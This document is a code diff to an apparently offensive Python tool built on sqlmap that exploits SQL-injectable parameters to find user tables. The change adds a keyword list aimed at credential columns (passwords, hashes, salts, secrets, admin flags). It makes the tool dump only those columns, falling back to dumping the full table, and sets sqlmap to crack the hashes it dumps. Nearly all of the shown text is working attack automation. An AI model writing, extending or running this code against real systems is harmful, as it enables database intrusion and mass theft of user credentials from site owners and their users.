@@ -60,11 +60,19 @@ SQLMAP_TIMEOUT = "30"
 SQLMAP_RETRIES = "3"
 SQLMAP_UNION_CHAR = "UCHAR"
 
+# Keywords to identify user tables
 USER_TABLE_KEYWORDS = [
     'user', 'users', 'admin', 'admins', 'member', 'members',
     'login', 'logins', 'account', 'accounts', 'profile', 'profiles',
     'customer', 'customers', 'employee', 'employees',
     'auth', 'role', 'roles', 'wp_users', 'admin_users'
+]
+
+# Keywords to target only specific sensitive user columns
+USER_COLUMN_KEYWORDS = [
+    'user', 'username', 'usr', 'login', 'name', 'email', 'mail',
+    'pass', 'password', 'pwd', 'hash', 'salt', 'crypt', 'secret',
+    'role', 'priv', 'privilege', 'admin', 'is_admin', 'status'
 ]
 
 SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"
@@ -77,7 +85,7 @@ def display_banner():
     print(Fore.CYAN + """
 ╔═══════════════════════════════════════════════════════════════╗
 ║                    👥 USERS DUMP MODULE                       ║
-║       SCANS FOR ANY TABLE WITH USER DATA                      ║
+║       SCANS AND DUMPS ONLY SENSITIVE USER COLUMNS             ║
 ║                    Author: nu11secur1ty                       ║
 ╚═══════════════════════════════════════════════════════════════╝
 """ + Style.RESET_ALL)
@@ -179,7 +187,6 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
     databases = []
     in_db_section = False
     
-    # Filter out common non-target / administrative outputs
     skip = [
         'information_schema', 'performance_schema', 'mysql', 'sys', 
         'phpmyadmin', 'starting', 'ending', 'resuming', 'fetching', 'testing'
@@ -188,24 +195,20 @@ def get_databases(sqlmap_path, exploit_path, vuln_params):
     for line in output.split('\n'):
         line_clean = line.strip()
         
-        # Identify the start of database list
         if "available databases [" in line_clean.lower():
             in_db_section = True
             continue
         
         if in_db_section:
-            # Skip noise or standard logging within active database sections
             if any(log_lvl in line_clean.lower() for log_lvl in ["[info]", "[warning]", "[error]", "[critical]"]):
                 continue
                 
-            # Collect matched databases with standard wildcard format
             match = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
             if match:
                 db = match.group(1)
                 if db.lower() not in skip:
                     databases.append(db)
             elif line_clean and not line_clean.startswith('[*]'):
-                # Terminate loop when logging leaves target bounds
                 if len(databases) > 0:
                     in_db_section = False
     
@@ -238,7 +241,6 @@ def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
     for line in output.split('\n'):
         line_clean = line.strip()
         
-        # Parse output from sqlmap ASCII grids (e.g., | table_name |)
         match_grid = re.search(r'^\|\s*([\w\-_]+)\s*\|', line_clean)
         if match_grid:
             table = match_grid.group(1)
@@ -246,7 +248,6 @@ def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
                 tables.append(table)
                 continue
         
-        # Fallback to standard list extraction
         match_list = re.match(r'^\[\*\]\s+([\w\-_]+)\s*$', line_clean)
         if match_list:
             table = match_list.group(1)
@@ -278,8 +279,34 @@ def find_user_tables(sqlmap_path, exploit_path, vuln_params):
     
     return sorted(set(all_tables))
 
+def get_columns_from_table(sqlmap_path, exploit_path, vuln_params, db, table):
+    """Retrieve all column names from a specific table"""
+    print(Fore.CYAN + f"[*] Fetching columns for {db}.{table if db else table}..." + Style.RESET_ALL)
+    
+    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
+    if db:
+        cmd += ["-D", db]
+    cmd += ["-T", table, "--columns"]
+    
+    output = run_sqlmap_with_techniques(cmd, f"Fetching columns from {table}")
+    if not output:
+        return []
+    
+    columns = []
+    for line in output.split('\n'):
+        line_clean = line.strip()
+        # Parse ASCII database tables structure from sqlmap output (e.g. | column_name | type |)
+        match = re.search(r'^\|\s*([\w\-_]+)\s*\|\s*[\w\-_().\s]+\s*\|', line_clean)
+        if match:
+            col = match.group(1)
+            if col.lower() not in ['column', 'type'] and not col.startswith('-'):
+                columns.append(col)
+                
+    return sorted(list(set(columns)))
+
 def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
-    print(Fore.CYAN + f"\n[+] Dumping table: {full_table_name}..." + Style.RESET_ALL)
+    """Dumps ONLY specific user columns if found, otherwise falls back to normal dump"""
+    print(Fore.CYAN + f"\n[+] Processing target table: {full_table_name}..." + Style.RESET_ALL)
     
     if '.' in full_table_name:
         db, table = full_table_name.split('.', 1)
@@ -287,14 +314,32 @@ def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
         db = None
         table = full_table_name
     
-    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
+    # 1. Fetch columns first
+    columns = get_columns_from_table(sqlmap_path, exploit_path, vuln_params, db, table)
     
+    target_columns = []
+    if columns:
+        # 2. Filter columns matching user keywords
+        for col in columns:
+            col_lower = col.lower()
+            if any(kw in col_lower for kw in USER_COLUMN_KEYWORDS):
+                target_columns.append(col)
+                
+    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
     if db:
         cmd += ["-D", db]
+    cmd += ["-T", table]
     
-    cmd += ["-T", table, "--dump"]
+    # 3. Configure dump parameter (-C for specific columns vs full --dump)
+    if target_columns:
+        cols_str = ",".join(target_columns)
+        print(Fore.GREEN + f"🎯 Found sensitive user columns: {cols_str}" + Style.RESET_ALL)
+        cmd += ["-C", cols_str, "--dump"]
+    else:
+        print(Fore.YELLOW + "⚠️ No specific user columns matched. Dumping entire table as fallback." + Style.RESET_ALL)
+        cmd += ["--dump"]
     
-    print(Fore.YELLOW + f"[*] Dumping {full_table_name}..." + Style.RESET_ALL)
+    print(Fore.YELLOW + f"[*] Dumping data..." + Style.RESET_ALL)
     print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
     print("-" * 60)
     
@@ -410,7 +455,7 @@ def run_users_dump():
         print(f"{i}. {table}")
     print("="*60)
     
-    dump_all = input(Fore.YELLOW + "\nDump ALL tables? [Y/n]: " + Style.RESET_ALL).strip().lower()
+    dump_all = input(Fore.YELLOW + "\nDump selected tables (Only User Columns)? [Y/n]: " + Style.RESET_ALL).strip().lower()
     
     tables_to_dump = []
     if dump_all in ("", "y", "yes"):
@@ -433,7 +478,7 @@ def run_users_dump():
         return
     
     print(Fore.CYAN + "\n" + "="*60)
-    print(f"DUMPING {len(tables_to_dump)} USER TABLES")
+    print(f"DUMPING {len(tables_to_dump)} USER TABLES (TARGETED COLUMNS)")
     print("="*60 + Style.RESET_ALL)
     print(Fore.CYAN + "[*] SQLmap will save results to its default output directory" + Style.RESET_ALL)
     print(Fore.CYAN + "[*] SQLmap output will appear below with original colors:" + Style.RESET_ALL)
@@ -450,9 +495,9 @@ def run_users_dump():
     print(Fore.CYAN + "\n" + "="*60)
     print("USERS DUMP COMPLETE")
     print("="*60 + Style.RESET_ALL)
-    print(Fore.GREEN + f"❌ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
-    print(Fore.YELLOW + "📁 SQLmap saved CSV files in its default output directory" + Style.RESET_ALL)
-    print(Fore.CYAN + "💡 Check sqlmap output directory for CSV files with user data" + Style.RESET_ALL)
+    print(Fore.GREEN + f"✅ Successfully processed: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
+    print(Fore.YELLOW + "📁 SQLmap saved targeted CSV files in its default output directory" + Style.RESET_ALL)
+    print(Fore.CYAN + "💡 Check sqlmap output directory for custom CSV files containing only user columns" + Style.RESET_ALL)
     print("="*60)
     
     input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
